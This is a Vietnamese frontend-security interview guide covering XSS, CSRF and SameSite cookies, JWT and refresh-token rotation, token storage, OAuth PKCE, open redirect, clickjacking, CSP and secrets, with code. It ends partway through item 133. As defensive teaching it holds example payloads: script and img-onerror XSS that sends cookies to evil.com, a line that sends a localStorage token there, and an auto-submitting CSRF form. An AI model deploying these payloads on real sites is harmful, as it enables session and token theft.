# 07. Security - 13 Câu Hỏi Senior

> 13 câu hỏi bảo mật Frontend (Câu 122-134) - từ XSS, CSRF, JWT, OAuth2, CSP đến quản lý token và secret. Senior không chỉ code feature mà còn phải đóng mọi cánh cửa attacker có thể chui vào.

## Mục lục

- [Câu 122: XSS là gì? Stored, Reflected và DOM-based khác nhau thế nào?](#câu-122-xss-là-gì-stored-reflected-và-dom-based-khác-nhau-thế-nào)
- [Câu 123: Phòng chống XSS - escape, sanitize và framework](#câu-123-phòng-chống-xss---escape-sanitize-và-framework)
- [Câu 124: CSRF là gì? SameSite Cookie hoạt động thế nào?](#câu-124-csrf-là-gì-samesite-cookie-hoạt-động-thế-nào)
- [Câu 125: SameSite Lax vs Strict vs None và CSRF Token](#câu-125-samesite-lax-vs-strict-vs-none-và-csrf-token)
- [Câu 126: JWT - cấu trúc, ưu nhược điểm vs Session](#câu-126-jwt---cấu-trúc-ưu-nhược-điểm-vs-session)
- [Câu 127: Access Token và Refresh Token - vòng đời và rotation](#câu-127-access-token-và-refresh-token---vòng-đời-và-rotation)
- [Câu 128: Lưu token ở đâu? localStorage vs HttpOnly Cookie vs Memory](#câu-128-lưu-token-ở-đâu-localstorage-vs-httponly-cookie-vs-memory)
- [Câu 129: OAuth2 và OIDC - Authorization Code Flow + PKCE](#câu-129-oauth2-và-oidc---authorization-code-flow--pkce)
- [Câu 130: Open Redirect - nguy cơ và phòng chống](#câu-130-open-redirect---nguy-cơ-và-phòng-chống)
- [Câu 131: Clickjacking - X-Frame-Options và frame-ancestors](#câu-131-clickjacking---x-frame-options-và-frame-ancestors)
- [Câu 132: Content Security Policy (CSP) - directive chi tiết](#câu-132-content-security-policy-csp---directive-chi-tiết)
- [Câu 133: Frontend có nên chứa secret? API key và env var](#câu-133-frontend-có-nên-chứa-secret-api-key-và-env-var)
- [Câu 134: Checklist bảo mật Frontend toàn diện](#câu-134-checklist-bảo-mật-frontend-toàn-diện)


[↑ Quay lại Mục lục](#mục-lục)

---

### Câu 122: XSS là gì? Stored, Reflected và DOM-based khác nhau thế nào?

**Trả lời Senior:**
XSS (Cross-Site Scripting) là attacker chèn script độc vào trang của bạn, chạy với quyền user nạn nhân - đọc `localStorage`, cookie (nếu không HttpOnly), gọi API, thay DOM. XSS là lỗ hổng số 1 của OWASP cho frontend.

Ba loại khác nhau ở **nơi payload sống**:

- **Stored (Persistent)**: payload lưu trong DB, mọi user xem đều dính. Ví dụ comment `<script>fetch('https://evil.com?c='+document.cookie)</script>` lưu vào DB, backend trả về không escape. Nguy hiểm nhất, scale rộng.
- **Reflected (Non-persistent)**: payload nằm trong URL/query, server phản chiếu lại trong response không escape. Ví dụ `https://shop.com/search?q=<script>alert(1)</script>`, attacker dụ user click link. Không lưu DB, nhưng kết hợp phishing rất hiệu quả.
- **DOM-based**: payload không qua server, chỉ xử lý ở client. Ví dụ `element.innerHTML = location.hash.slice(1)`, attacker gửi `https://app.com#<img src=x onerror=alert(1)>`. Server không thấy gì, WAF không chặn.

```javascript
// ❌ Stored: backend trả comment không escape
// API: { comment: "<img src=x onerror='fetch(\"https://evil.com?c=\"+document.cookie)'>" }
// Frontend:
element.innerHTML = comment; // dính

// ❌ Reflected: search?q=<script>...
// Server render: <div>Kết quả cho: ${query}</div> // không escape

// ❌ DOM-based
const hash = location.hash.slice(1);
document.getElementById('preview').innerHTML = hash; // hash attacker control

// ✅ Luôn coi user input là text, không phải HTML
element.textContent = comment; // safe
```

| Loại | Lưu đâu | Server thấy? | Ví dụ |
|---|---|---|---|
| Stored | DB | Có | Comment, profile |
| Reflected | URL | Có | Search, error message |
| DOM-based | Client | Không | `innerHTML`, `eval(location.hash)` |

**Trade-off:** Stored fix ở backend (escape khi render) + frontend (không `innerHTML`). DOM-based phải fix ở frontend, khó phát hiện bằng scan server.

**Câu hỏi đào sâu:** Vì sao React `{userInput}` đã an toàn còn `dangerouslySetInnerHTML` thì không? DOM-based XSS vì sao WAF không chặn được?


[↑ Quay lại Mục lục](#mục-lục)

---

### Câu 123: Phòng chống XSS - escape, sanitize và framework

**Trả lời Senior:**
Nguyên tắc vàng: **không bao giờ chèn user input như HTML**, hoặc nếu bắt buộc thì **escape/sanitize** đúng context. XSS xảy ra ở nhiều context: HTML body, attribute, JS, URL, CSS - mỗi context cần escape khác nhau.

Tầng phòng thủ:

1.  **Escape output**: `&` → `&amp;`, `<` → `&lt;`, `>` → `&gt;`, `"` → `&quot;`. React tự escape khi dùng `{value}`, chỉ `dangerouslySetInnerHTML` mới nguy hiểm.
2.  **Sanitize khi cần HTML**: dùng `DOMPurify` để whitelist tag, loại bỏ `onerror`, `javascript:`.
3.  **Không dùng sink nguy hiểm**: `innerHTML`, `outerHTML`, `document.write`, `eval`, `new Function`, `setTimeout(string)`.
4.  **HttpOnly cookie**: dù XSS vẫn chạy, không đọc được cookie HttpOnly.
5.  **CSP**: chặn inline script dù attacker chèn được.

```javascript
// ✅ React auto-escape
function Comment({ text }: { text: string }) {
  return <div>{text}</div>; // text = "<script>" được escape thành text
}

// ❌ Nguy hiểm
function Unsafe({ html }: { html: string }) {
  return <div dangerouslySetInnerHTML={{ __html: html }} />; // XSS nếu html từ user
}

// ✅ Sanitize nếu buộc phải render HTML (rich text)
import DOMPurify from 'dompurify';
function SafeHTML({ html }: { html: string }) {
  const clean = DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['b', 'i', 'a', 'p', 'ul', 'li'],
    ALLOWED_ATTR: ['href'],
  });
  return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}

// ✅ URL context
const url = userInput; // userInput = "javascript:alert(1)"
// ❌ <a href={url}>
// ✅ Validate
function safeUrl(url: string) {
  try {
    const u = new URL(url, location.origin);
    if (!['http:', 'https:'].includes(u.protocol)) return '/';
    return u.href;
  } catch { return '/'; }
}

// ✅ Không eval
// ❌ eval(userInput), new Function(userInput), setTimeout(userInput, 0)
```

**Trade-off:** `DOMPurify` thêm ~10KB, nhưng bắt buộc nếu cho user nhập rich text. Escape quá mức làm mất tính năng (muốn cho `<b>` thì phải sanitize thay vì escape).

**Câu hỏi đào sâu:** Vì sao `DOMPurify` tốt hơn tự regex loại `<script>`? `textContent` khác `innerText` khác `innerHTML` thế nào về XSS?


[↑ Quay lại Mục lục](#mục-lục)

---

### Câu 124: CSRF là gì? SameSite Cookie hoạt động thế nào?

**Trả lời Senior:**
CSRF (Cross-Site Request Forgery) là attacker lừa **browser của nạn nhân** tự gửi request tới `bank.com` với **cookie tự động đính kèm**. User đang đăng nhập `bank.com`, vào `evil.com`, `evil.com` có `<form action="https://bank.com/transfer" method="POST">` + auto submit, browser gửi cookie `bank.com` kèm, server tưởng user tự làm.

Khác XSS: XSS chạy script trong origin nạn nhân, CSRF lợi dụng browser tự gửi credential cross-origin.

Browser fix bằng **SameSite Cookie**:

- Cookie không có `SameSite` mặc định là `Lax` (Chrome 80+).
- `SameSite` cho browser biết khi nào **không gửi cookie cross-site**.

```html
<!-- evil.com -->
<form id="f" action="https://bank.com/api/transfer" method="POST">
  <input name="to" value="attacker" />
  <input name="amount" value="10000" />
</form>
<script>document.getElementById('f').submit();</script>
<!-- Browser sẽ gửi cookie bank.com nếu SameSite=None hoặc không set Lax -->

<!-- Hoặc đơn giản hơn với GET (nếu API dùng GET cho state-changing - sai REST) -->
<img src="https://bank.com/api/transfer?to=attacker&amount=10000" />
```

```http
# Server set cookie
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600

# Với Lax: chỉ gửi cross-site cho top-level GET navigation (click link), không gửi cho POST/PUT/DELETE cross-site
# Với Strict: không gửi cả GET cross-site
# Với None: luôn gửi, nhưng phải kèm Secure (HTTPS)
```

| SameSite | Gửi khi cross-site POST? | Gửi khi click link từ evil? | Dùng khi nào |
|---|---|---|---|
| Lax | Không | Có (GET top-level) | Mặc định, cân bằng |
| Strict | Không | Không | Bank, admin |
| None | Có (phải Secure) | Có | Embed, iframe cần cookie |

**Trade-off:** `SameSite` là phòng tuyến đầu, nhưng không đủ một mình - cần thêm CSRF token và check `Origin`/`Referer` cho API quan trọng. `SameSite=None` phải `Secure`, không chạy HTTP.

**Câu hỏi đào sâu:** Vì sao `<img src="https://bank.com/transfer">` vẫn gửi cookie dù là GET? Vì sao API state-changing không bao giờ nên dùng GET?


[↑ Quay lại Mục lục](#mục-lục)

---

### Câu 125: SameSite Lax vs Strict vs None và CSRF Token

**Trả lời Senior:**
`SameSite` không chặn hết CSRF, và mỗi giá trị có trade-off UX vs bảo mật. Senior phải kết hợp **SameSite + CSRF Token + Origin check**.

- **Lax (default)**: chặn POST/PUT/DELETE cross-site, nhưng **cho phép GET top-level navigation**. Nghĩa là user click link từ `evil.com` sang `bank.com` vẫn gửi cookie, nhưng `evil.com` fetch POST ngầm thì không. Cân bằng nhất, không break OAuth redirect.
- **Strict**: chặn **cả GET cross-site**. User click link từ email/Gmail sang `bank.com` cũng không gửi cookie → bị logout, phải login lại. An toàn nhất nhưng UX tệ.
- **None**: luôn gửi, dùng cho **embed** (widget, iframe) cần cross-site cookie, nhưng phải `Secure` + `SameSite=None` mới được Chrome chấp nhận.

Vì `Lax` vẫn cho GET, attacker có thể dùng GET để CSRF nếu API sai (dùng GET để đổi state). Nên cần thêm **CSRF Token**: server sinh token ngẫu nhiên per-session, nhúng vào HTML/meta, client gửi lại qua header `X-CSRF-Token`, server verify. Attacker ở `evil.com` không đọc được token (do SOP), nên không forge được.

```javascript
// Server (Express)
import crypto from 'crypto';
app.use((req, res, next) => {
  if (!req.cookies.csrfToken) {
    res.cookie('csrfToken', crypto.randomBytes(32).toString('hex'), { sameSite: 'Lax', secure: true });
  }
  next();
});
// Render: <meta name="csrf-token" content="<%= csrfToken %>">

// Client
const token = document.querySelector('meta[name="csrf-token"]')?.getAttribute('content');
fetch('/api/transfer', {
  method: 'POST',
  headers: { 'X-CSRF-Token': token!, 'Content-Type': 'application/json' },
  credentials: 'include',
  body: JSON.stringify({ to: 'bob', amount: 100 }),
});

// Server verify
app.post('/api/transfer', (req, res) => {
  const token = req.headers['x-csrf-token'];
  if (token !== req.cookies.csrfToken) return res.status(403).json({ error: 'CSRF' });
  // check Origin nữa
  if (!['https://bank.com', 'https://app.bank.com'].includes(req.headers.origin)) return res.status(403).end();
});
```

**Trade-off:** `Strict` an toàn nhưng break flow OAuth/login từ ngoài. `Lax + CSRF Token` là combo thực tế cho 90% app. `None` chỉ dùng khi bắt buộc cross-site và đã hiểu rủi ro.

**Câu hỏi đào sâu:** Vì sao CSRF Token phải gửi qua header thay vì cookie? Double Submit Cookie pattern khác gì Synchronizer Token?


[↑ Quay lại Mục lục](#mục-lục)

---

### Câu 126: JWT - cấu trúc, ưu nhược điểm vs Session

**Trả lời Senior:**
JWT (JSON Web Token) là chuỗi `header.payload.signature` base64url, tự chứa data và tự verify bằng signature, không cần lưu server. Cấu trúc: `eyJhbG... (header) . eyJzdWI... (payload) . SflKxw... (signature HMAC/RSA)`.

- **Header**: `{ alg: "HS256", typ: "JWT" }`
- **Payload**: claims `{ sub: "123", exp: 1714000000, iat, iss, aud, role }` - **không mã hóa**, chỉ base64, ai cũng đọc được.
- **Signature**: `HMACSHA256(base64(header)+"."+base64(payload), secret)` hoặc RSA.

Ưu: **stateless**, scale horizontally không cần session store, dùng cho microservices (mỗi service verify bằng public key), phù hợp mobile/API. Nhược: **không revoke được** trước khi hết hạn (phải đợi `exp` hoặc blacklist), **to** (1-2KB, gửi mỗi request tốn bandwidth), **XSS đọc được nếu lưu localStorage**, và nếu dùng `none` alg hoặc secret yếu thì bị forge.

So với **Session (opaque token + store)**: session lưu data ở server (Redis), cookie chỉ là `sessionId` ngẫu nhiên, **revoke ngay** bằng xóa Redis, nhỏ (4KB), nhưng **stateful** - cần sticky session hoặc shared store.

```javascript
// JWT tạo & verify (Node)
import jwt from 'jsonwebtoken';
const token = jwt.sign({ sub: 'user123', role: 'admin' }, 'secret', { expiresIn: '15m', issuer: 'myapp' });
// header.payload.signature
const payload = jwt.verify(token, 'secret'); // throw nếu hết hạn/sai signature
// Lưu ý: payload đọc được
console.log(JSON.parse(atob(token.split('.')[1]))); // { sub: "user123", role: "admin" }

// Session (Redis)
import { createClient } from 'redis';
const sessionId = crypto.randomUUID();
await redis.set(`sess:${sessionId}`, JSON.stringify({ userId: '123', role: 'admin' }), { EX: 3600 });
res.setHeader('Set-Cookie', `sid=${sessionId}; HttpOnly; Secure; SameSite=Lax; Path=/`);
// Verify: const data = await redis.get(`sess:${sid}`) // revoke = del key
```

| | JWT | Session |
|---|---|---|
| State | Stateless | Stateful (Redis/DB) |
| Revoke | Khó (đợi exp/blacklist) | Dễ (xóa store) |
| Size | Lớn (payload trong token) | Nhỏ (chỉ id) |
| Scale | Dễ (không share store) | Cần shared store |
| XSS | Nguy hiểm nếu localStorage | HttpOnly giảm rủi ro |

**Trade-off:** JWT hợp cho API public, microservices, SSO. Session hợp cho web truyền thống cần revoke/logout ngay. Nhiều hệ thống dùng **JWT ngắn hạn (15p) + Refresh Token + Redis blacklist** để cân bằng.

**Câu hỏi đào sâu:** Vì sao JWT không nên lưu `role` nhạy cảm mà không check DB? `alg: none` attack là gì?


[↑ Quay lại Mục lục](#mục-lục)

---

### Câu 127: Access Token và Refresh Token - vòng đời và rotation

**Trả lời Senior:**
Dùng 1 JWT dài hạn (7 ngày) lưu localStorage là **anti-pattern**: XSS lấy được dùng 7 ngày, không revoke. Pattern chuẩn là **Access Token ngắn + Refresh Token dài + rotation**.

- **Access Token**: JWT ngắn **5-15 phút**, chứa `sub`, `role`, `scope`, gửi kèm mọi request qua `Authorization: Bearer <access>`. Lưu ở **memory** (biến JS) để XSS khó đọc qua `localStorage`, mất khi reload nhưng refresh được.
- **Refresh Token**: opaque string (random 32 bytes) hoặc JWT dài **7-30 ngày**, chỉ dùng để gọi `/refresh` lấy access mới. Lưu ở **HttpOnly Secure SameSite cookie** (hoặc `httpOnly` + `Secure`), không cho JS đọc. Server lưu trong DB/Redis với `userId`, `expires`, `revoked`, `family`.
- **Rotation**: mỗi lần `/refresh`, server **thu hồi refresh cũ**, cấp cặp mới (access + refresh). Nếu refresh cũ bị dùng lại → phát hiện **reuse** → revoke cả family (nghi token bị steal). Đây là **Refresh Token Rotation (RFC 6749 + best practice)**.

```javascript
// Luồng
// 1. Login: server set httpOnly refresh cookie + trả access
// POST /auth/login { email, pass } -> { accessToken: "eyJ..." } + Set-Cookie: refresh=abc; HttpOnly; Secure; SameSite=Lax; Max-Age=604800

// 2. Client lưu access trong memory
let accessToken: string | null = null;
async function login(email: string, pass: string) {
  const res = await fetch('/auth/login', { method: 'POST', body: JSON.stringify({ email, pass }) });
  const { accessToken: at } = await res.json();
  accessToken = at; // memory
}

// 3. Gọi API kèm access, 401 thì refresh
async function apiFetch(url: string, opts: RequestInit = {}) {
  let res = await fetch(url, { ...opts, headers: { ...opts.headers, Authorization: `Bearer ${accessToken}` } });
  if (res.status === 401) {
    const r = await fetch('/auth/refresh', { method: 'POST', credentials: 'include' }); // gửi refresh cookie
    if (!r.ok) { location.href = '/login'; throw new Error('refresh failed'); }
    const { accessToken: newAt } = await r.json();
    accessToken = newAt;
    res = await fetch(url, { ...opts, headers: { ...opts.headers, Authorization: `Bearer ${accessToken}` } });
  }
  return res;
}

// 4. Server /refresh với rotation
// app.post('/auth/refresh', async (req,res)=>{
//   const old = req.cookies.refresh;
//   const record = await db.refreshTokens.findOne({ token: old });
//   if (!record || record.revoked) { await db.refreshTokens.updateMany({ family: record.family }, { revoked: true }); return res.status(401).end(); }
//   await db.refreshTokens.updateOne({ token: old }, { revoked: true });
//   const newRefresh = crypto.randomBytes(32).toString('hex');
//   await db.refreshTokens.insert({ token: newRefresh, userId: record.userId, family: record.family });
//   res.cookie('refresh', newRefresh, { httpOnly: true, secure: true, sameSite: 'lax' });
//   res.json({ accessToken: jwt.sign({ sub: record.userId }, secret, { expiresIn: '15m' }) });
// });
```

**Trade-off:** Rotation an toàn nhưng phức tạp, cần DB, xử lý race (2 tab cùng refresh). Dùng **silent refresh + queue** để tránh double refresh. Access ngắn thì UX phải refresh ngầm, không bắt user login lại.

**Câu hỏi đào sâu:** Vì sao phải rotation refresh token? Làm sao xử lý khi 2 tab cùng refresh cùng lúc gây race?


[↑ Quay lại Mục lục](#mục-lục)

---

### Câu 128: Lưu token ở đâu? localStorage vs HttpOnly Cookie vs Memory

**Trả lời Senior:**
Chọn nơi lưu token là quyết định **XSS vs CSRF trade-off**.

- **localStorage/sessionStorage**: dễ code (`localStorage.setItem('token', jwt)`), persist sau reload, nhưng **XSS đọc được ngay** (`localStorage.getItem('token')`), và **không tự gửi**, phải gắn header thủ công. Không nên lưu token nhạy cảm ở đây, trừ khi chấp nhận rủi ro và có CSP mạnh.
- **HttpOnly Cookie**: JS **không đọc được** (`document.cookie` không thấy), chống XSS tốt, **tự gửi** kèm mọi request (tiện nhưng CSRF). Cần `Secure` (chỉ HTTPS), `SameSite=Lax/Strict`, và **CSRF token** cho state-changing. Dùng cho **refresh token**, và có thể cho access token nếu chấp nhận CSRF mitigation.
- **Memory (biến JS)**: `let accessToken = null` trong closure/module, **XSS vẫn đọc được nếu attacker chạy JS** (vì JS có thể đọc biến nếu inject), nhưng **khó hơn** localStorage (phải hook), và **mất khi reload** → phải refresh. An toàn nhất cho access token ngắn, kết hợp httpOnly refresh.

Bảng:

| Nơi lưu | XSS đọc? | CSRF? | Persist reload? | Dùng cho |
|---|---|---|---|---|
| localStorage | Dễ `getItem` | Không (tự gắn header) | Có | Không nên cho token |
| HttpOnly Cookie | Không | Có (tự gửi) | Có | Refresh token, session |
| Memory | Khó hơn (cần JS) | Không | Không | Access token ngắn |
| sessionStorage | Dễ | Không | Tab only | Tạm, cũng XSS |

Pattern Senior khuyên: **Access token trong memory + Refresh token trong HttpOnly Secure SameSite Lax cookie + CSRF token cho refresh endpoint nếu cần**. Đừng lưu JWT trong `localStorage` nếu có thể tránh.

```javascript
// ❌ Dễ XSS
localStorage.setItem('access', jwt); // attacker: fetch('https://evil.com?c='+localStorage.getItem('access'))

// ✅ Memory + httpOnly
let accessToken: string | null = null; // closure
// refresh httpOnly: Set-Cookie: refresh=...; HttpOnly; Secure; SameSite=Lax
// Khi reload, access mất -> gọi /refresh để lấy lại

// Nếu buộc dùng localStorage (ví dụ SPA không có backend set cookie), giảm rủi ro:
// - CSP strict, escape, DOMPurify
// - Access ngắn 5p, không lưu refresh trong localStorage
// - Dùng fingerprint: lưu hash của refresh trong JWT, server check
```

**Trade-off:** HttpOnly + SameSite chống XSS nhưng mở CSRF, phải thêm token. Memory an toàn nhưng UX cần silent refresh. localStorage tiện nhưng là mục tiêu số 1 của XSS.

**Câu hỏi đào sâu:** Vì sao `HttpOnly` không chặn được CSRF? Khi nào chấp nhận lưu token trong localStorage (ví dụ mobile WebView)?


[↑ Quay lại Mục lục](#mục-lục)

---

### Câu 129: OAuth2 và OIDC - Authorization Code Flow + PKCE

**Trả lời Senior:**
OAuth2 là **ủy quyền** (cho app A quyền gọi API của app B thay user, không cho mật khẩu), OIDC là **xác thực** (thêm `id_token` JWT chứa `sub`, `email` để biết user là ai). Frontend dùng **Authorization Code Flow + PKCE** (RFC 7636) - chuẩn hiện tại, thay thế Implicit flow (đã deprecated vì token trong URL).

Flow PKCE cho SPA/public client (không có client_secret):

1.  SPA tạo `code_verifier` (random 43-128 chars) và `code_challenge = BASE64URL(SHA256(verifier))`.
2.  Redirect user tới `https://auth.example.com/authorize?response_type=code&client_id=xxx&redirect_uri=https://app.com/callback&scope=openid profile&code_challenge=xxx&code_challenge_method=S256&state=yyy` (`state` chống CSRF).
3.  User login ở IdP, IdP redirect về `https://app.com/callback?code=abc&state=yyy` (code ngắn 10p, 1 lần).
4.  SPA gọi **backend** (hoặc trực tiếp nếu public) `POST /token { code, code_verifier, client_id, redirect_uri }` → IdP verify `verifier` với `challenge`, trả `access_token` + `refresh_token` + `id_token`.
5.  Backend set httpOnly refresh, trả access cho SPA.

Vì sao PKCE? Ngăn attacker chặn `code` trên redirect (đặc biệt mobile), không có `verifier` thì không đổi được token.

```javascript
// 1. Tạo PKCE
function base64url(buf: ArrayBuffer) { return btoa(String.fromCharCode(...new Uint8Array(buf))).replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,''); }
async function createPKCE() {
  const verifier = base64url(crypto.getRandomValues(new Uint8Array(32)));
  const challenge = base64url(await crypto.subtle.digest('SHA-256', new TextEncoder().encode(verifier)));
  sessionStorage.setItem('pkce_verifier', verifier);
  return challenge;
}
// 2. Redirect
const challenge = await createPKCE();
const state = crypto.randomUUID();
sessionStorage.setItem('oauth_state', state);
location.href = `https://auth.example.com/authorize?response_type=code&client_id=app123&redirect_uri=${encodeURIComponent(location.origin + '/callback')}&scope=openid%20profile%20email&code_challenge=${challenge}&code_challenge_method=S256&state=${state}`;

// 3. Callback
const params = new URLSearchParams(location.search);
if (params.get('state') !== sessionStorage.getItem('oauth_state')) throw new Error('CSRF');
const code = params.get('code');
// 4. Đổi code
const res = await fetch('/api/auth/callback', { method: 'POST', body: JSON.stringify({ code, verifier: sessionStorage.getItem('pkce_verifier') }) });
// server sẽ gọi IdP token endpoint với verifier
```

**Trade-off:** PKCE thêm bước nhưng bắt buộc cho SPA. Không bao giờ dùng Implicit (`response_type=token`) - token lộ trong URL/history. Luôn dùng `state` và validate `iss`, `aud`, `nonce` trong `id_token`.

**Câu hỏi đào sâu:** Vì sao Implicit flow bị deprecated? `state` và `nonce` khác nhau thế nào? Khi nào cần `client_secret` và khi nào không?


[↑ Quay lại Mục lục](#mục-lục)

---

### Câu 130: Open Redirect - nguy cơ và phòng chống

**Trả lời Senior:**
Open Redirect là backend/frontend redirect tới **URL do user control** mà không validate, attacker dùng để phishing: `https://shop.com/redirect?url=https://evil.com` hoặc `https://shop.com/login?next=https://evil.com`. User tin `shop.com` nên click, bị đưa tới `evil.com` giả mạo login, mất credential.

Nguy hiểm khi kết hợp với OAuth: `redirect_uri` không validate, attacker lấy `code`.

Phòng chống: **không bao giờ redirect theo user input thô**, phải **whitelist** hoặc **chỉ cho phép relative path**.

```javascript
// ❌ Open redirect
// GET /redirect?url=https://evil.com
app.get('/redirect', (req, res) => {
  res.redirect(req.query.url); // attacker control
});
// Frontend
const next = new URLSearchParams(location.search).get('next');
if (next) location.href = next; // https://shop.com/login?next=https://evil.com

// ✅ Chỉ cho relative hoặc whitelist
const ALLOWED_HOSTS = ['shop.com', 'app.shop.com'];
function safeRedirect(url: string, fallback = '/') {
  try {
    const u = new URL(url, location.origin); // nếu url là "/dashboard" -> https://shop.com/dashboard
    if (u.origin !== location.origin) {
      // absolute URL -> check whitelist
      if (!ALLOWED_HOSTS.includes(u.hostname)) return fallback;
    }
    // Chỉ cho path, không cho //evil.com
    if (url.startsWith('//')) return fallback;
    return u.pathname + u.search + u.hash;
  } catch { return fallback; }
}

// Sử dụng
app.get('/redirect', (req, res) => {
  const target = safeRedirect(req.query.url as string, '/');
  res.redirect(target);
});

// OAuth: validate redirect_uri exact match đã đăng ký
// if (redirect_uri !== registered_uri) throw error
```

Check thêm: `//evil.com` (protocol-relative), `https://shop.com.evil.com`, `https://evil.com@shop.com`.

**Trade-off:** Whitelist chặt an toàn nhưng tốn công maintain. Relative path đơn giản nhất cho `?next=/dashboard`.

**Câu hỏi đào sâu:** Vì sao `//evil.com` vẫn là open redirect dù không có `https:`? Làm sao attacker lợi dụng open redirect để bypass CSP?


[↑ Quay lại Mục lục](#mục-lục)

---

### Câu 131: Clickjacking - X-Frame-Options và frame-ancestors

**Trả lời Senior:**
Clickjacking là attacker nhúng trang nạn nhân vào `iframe` trong suốt, đặt **nút giả** đè lên nút thật, dụ user click. Ví dụ `evil.com` iframe `bank.com/transfer` opacity 0, user tưởng click "Nhận quà" nhưng thực ra click "Transfer" trong iframe.

Phòng chống bằng cách **không cho trang bị frame** bởi origin khác:

- **X-Frame-Options** (cũ): `DENY` (không cho frame), `SAMEORIGIN` (chỉ cùng origin), `ALLOW-FROM uri` (deprecated).
- **CSP `frame-ancestors`** (mới, thay thế): `Content-Security-Policy: frame-ancestors 'self'` hoặc `'none'` hoặc `https://trusted.com`. Ưu tiên CSP vì hỗ trợ nhiều origin và báo cáo.

Ngoài ra, với **frame busting JS** (cũ, không đáng tin): `if (top !== self) top.location = self.location`, nhưng bị bypass bằng `sandbox`.

```http
# Backend header - chặn hết
X-Frame-Options: DENY
Content-Security-Policy: frame-ancestors 'none'

# Chỉ cho tự frame
X-Frame-Options: SAMEORIGIN
Content-Security-Policy: frame-ancestors 'self'

# Cho partner
Content-Security-Policy: frame-ancestors 'self' https://partner.com https://*.trusted.com
Report-Only: frame-ancestors 'self'; report-uri /csp-report

# Nginx
add_header X-Frame-Options "SAMEORIGIN" always;
add_header Content-Security-Policy "frame-ancestors 'self'" always;
```

```javascript
// Frontend check có bị frame không (thêm lớp)
if (window.top !== window.self) {
  // đang bị frame - có thể break hoặc cảnh báo
  document.body.innerHTML = '<h1>Không cho phép nhúng trang này</h1>';
}

// Với iframe cần cho phép (ví dụ embed video), set allow
<iframe src="https://trusted.com/embed" sandbox="allow-scripts allow-same-origin"></iframe>
// sandbox không có allow-top-navigation sẽ chặn frame busting
```

**Trade-off:** `DENY` an toàn nhất nhưng nếu bạn cần embed (ví dụ widget) thì phải `frame-ancestors` whitelist. `X-Frame-Options` không hỗ trợ nhiều origin, nên luôn kèm CSP.

**Câu hỏi đào sâu:** `frame-ancestors` khác `child-src` thế nào? Vì sao `X-Frame-Options` vẫn cần dù đã có CSP?


[↑ Quay lại Mục lục](#mục-lục)

---

### Câu 132: Content Security Policy (CSP) - directive chi tiết

**Trả lời Senior:**
CSP là header cho browser **whitelist nguồn được phép** load script, style, image, connect... Nếu attacker chèn `<script src="https://evil.com/x.js">` mà CSP chỉ cho `'self'`, browser block. CSP là **phòng tuyến cuối** cho XSS, không thay escape nhưng giảm thiệt hại 90%.

Directive hay dùng:

- `default-src 'self'` - fallback cho mọi loại.
- `script-src 'self' https://cdn.example.com 'nonce-abc123'` - chỉ script từ self/CDN và inline có nonce.
- `style-src 'self' 'unsafe-inline'` (cần cho nhiều lib, nhưng cố gắng nonce).
- `img-src 'self' data: https:`.
- `connect-src 'self' https://api.example.com` - chặn fetch tới evil.
- `frame-ancestors 'none'` - chống clickjacking.
- `base-uri 'self'` - chặn `<base>` hijack.
- `form-action 'self'` - chặn form gửi tới evil.
- `object-src 'none'` - chặn Flash.

Triển khai: **Report-Only trước**, thu thập `report-uri`, fix vi phạm, rồi mới `enforce`.

```http
# Enforce
Content-Security-Policy: default-src 'self'; script-src 'self' https://cdn.example.com 'nonce-rAnd0m'; style-src 'self' 'nonce-rAnd0m'; img-src 'self' data: https:; connect-src 'self' https://api.example.com; frame-ancestors 'none'; base-uri 'self'; form-action 'self'; object-src 'none'; report-uri /csp-report

# Report-Only để test
Content-Security-Policy-Report-Only: default-src 'self'; script-src 'self'; report-uri /csp-report

# Với nonce - mỗi request random
# Server render: <script nonce="rAnd0m">console.log('allowed')</script>
# Header: script-src 'nonce-rAnd0m'
```

```javascript
// Express
import crypto from 'crypto';
app.use((req, res, next) => {
  const nonce = crypto.randomBytes(16).toString('base64');
  res.locals.nonce = nonce;
  res.setHeader('Content-Security-Policy', `default-src 'self'; script-src 'self' 'nonce-${nonce}' https://cdn.example.com; style-src 'self' 'nonce-${nonce}'; img-src 'self' data: https:; connect-src 'self' https://api.example.com; frame-ancestors 'none'; report-uri /csp-report`);
  next();
});
// Template: <script nonce="<%= nonce %>">/* inline cho phép */</script>

// Next.js (next.config.js)
async headers() {
  return [{ source: '/(.*)', headers: [{ key: 'Content-Security-Policy', value: "default-src 'self'; script-src 'self' 'nonce-xxx'" }] }];
}

// Thu thập report
app.post('/csp-report', express.json({ type: 'application/csp-report' }), (req, res) => {
  console.warn('CSP violation', req.body);
  res.status(204).end();
});
```

**Trade-off:** `nonce` an toàn nhưng phải sinh mỗi request, không cache được. `'unsafe-inline'` tiện nhưng mở cửa XSS. `'strict-dynamic'` cho phép script đã trust load thêm script, tiện cho bundler.

**Câu hỏi đào sâu:** `nonce` vs `hash` khác gì? `strict-dynamic` để làm gì và khi nào dùng?


[↑ Quay lại Mục lục](#mục-lục)

---

### Câu 133: Frontend có nên chứa secret? API key và env var

**Trả lời Senior:**
**Không bao giờ** chứa secret thật trong frontend bundle. Mọi thứ trong JS gửi tới browser là **public** - user mở DevTools → Sources → search là thấy, dù bạn `process.env.SECRET` hay obfuscate. `NEXT_PUBLIC_` hay `VITE_` đều **embed vào bundle** gửi client.

Secret thật: `DB_PASSWORD`, `JWT_SECRET`, `STRIPE_SECRET_KEY`, `AWS_SECRET_ACCESS_KEY`, `OAuth client_secret`. Nếu lộ, attacker dùng trực tiếp.

Frontend chỉ nên chứa **public key**: `NEXT_PUBLIC_API_URL`, `NEXT_PUBLIC_STRIPE_PUBLISHABLE_KEY` (pk_...), `Firebase apiKey` (public, nhưng cần restrict domain), `Sentry DSN`.

Cách đúng: **Secret ở server**, frontend gọi **backend proxy**, backend gắn secret rồi gọi nhà cung cấp.

```javascript
// ❌ Lộ secret - bundle chứa luôn
// .env: STRIPE_SECRET_KEY=sk_live_xxx
// frontend
const stripe = new Stripe(process.env.STRIPE_SECRET_KEY); // build ra bundle.js chứa sk_live_xxx -> lộ

// ✅ Đúng: frontend chỉ gọi backend
// frontend
async function createPayment(amount: number) {
  const res = await fetch('/api/payments', { method: 'POST', body: JSON.stringify({ amount }) });
  return res.json(); // backend tự dùng sk_live_xxx
}
// backend (Node)
import Stripe from 'stripe';
const stripe = new Stripe(process.env.STRIPE_SECRET_KEY!); // chỉ server đọc
